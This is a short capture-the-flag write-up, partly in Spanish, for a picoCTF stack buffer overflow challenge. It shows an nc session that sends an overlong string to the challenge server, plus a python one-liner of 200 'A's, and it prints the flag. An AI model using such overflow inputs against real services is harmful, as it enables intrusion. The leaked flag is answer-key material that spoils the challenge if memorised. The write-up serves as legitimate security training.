## Description
Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/174/vuln). You can view source [here](https://artifacts.picoctf.net/c/174/vuln.c). And connect with it using:
## Hints
1. How can you trigger the flag to print?
2. If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
3. Run `man gets` and read the BUGS section. How many characters can the program really read?

## Solution
En el archivo de vulnerabilidad decia que tenia un buffer de 100, sin embargo como uso un get() que se puede desbordar basto con llamar al servidor y darle una cadena muy larga para desbordarlo.

```bash
nc saturn.picoctf.net 61481
Input: 21dsjwuhihwenjfinwoenfuwnunwenwnvujsaicji0j09jaijsd0qjwdi0qehf80jinfb9uh0wifnquwefh0jqiwdh8w0jivhu9w8fjiwuehfjwiefhj0ifhuqu'9fjinuh0f8jiwenuh8fj0ipwneofhu0wjiefpnuh0w8ejifnowuhe0jfipnwe0hfjinpweh0jfiwnehfj0ipwmenfu0jiwehfj0iwenufhj0iwnoeufjiwnefhj0wineofuhjwenofuhwjeifnuhw08ejfipuwe80fjiweh0fjiwehf'jiw0efj'wienfj0wipefj0wienf0jiwpefj0wjifpifjmwkenofjiwnef0jiweofhuwji0efno0wjfiwh0e'9fjWHEFGYEGBFHRJ987WGYFBHINJOI8Y7WG8YBIWNOJI0EFU879EYFBINWJI0E8FH9WEF
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef7314c6}
```
Tambien se podia usar nc ...(servidor)... <<< $(python3 -c "print('A'*200)")
## Flag
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef7314c6}

## Aditional Notes

## References
